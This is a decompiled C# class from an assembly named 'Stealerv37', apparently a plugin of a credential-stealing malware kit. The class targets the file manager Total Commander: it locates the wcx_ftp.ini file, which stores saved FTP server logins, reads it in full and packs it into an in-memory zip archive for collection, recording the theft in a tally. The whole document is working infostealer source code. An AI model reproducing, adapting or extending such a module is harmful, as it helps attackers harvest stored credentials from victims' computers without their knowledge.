// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.TotalCommander
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Applications;

public class TotalCommander : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GHISLER", "wcx_ftp.ini");
    if (!File.Exists(path))
      return;
    string entryPath = "Total Commander\\wcx_ftp.ini";
    zip.AddFile(entryPath, File.ReadAllBytes(path));
    counter.Applications.Add(new Counter.CounterApplications()
    {
      Name = "Total Commander",
      Files = {
        $"{path} => {entryPath}",
        entryPath
      }
    });
  }
}
